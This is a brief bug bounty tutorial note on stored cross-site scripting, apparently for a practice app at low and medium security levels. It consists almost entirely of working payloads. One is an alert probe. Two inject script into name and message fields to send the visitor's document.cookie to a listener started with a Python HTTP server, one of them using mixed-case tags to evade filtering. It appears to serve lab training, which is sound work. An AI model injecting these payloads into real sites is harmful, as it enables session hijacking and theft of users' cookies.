# bug-bounty-tutorial
bug bounty tutorial

## 18.XSS-store

### low in name & message
```
python3 -m http.server 3000
<script>alert("XSS");</script>
```
### change textarea size
```
<script>window.location="http://127.0.0.1:3000/?cookie="+document.cookie</script>
```
### medium
### change input size
```
<ScRipT>window.location="http://127.0.0.1:3000/?cookie="+document.cookie</script>
```
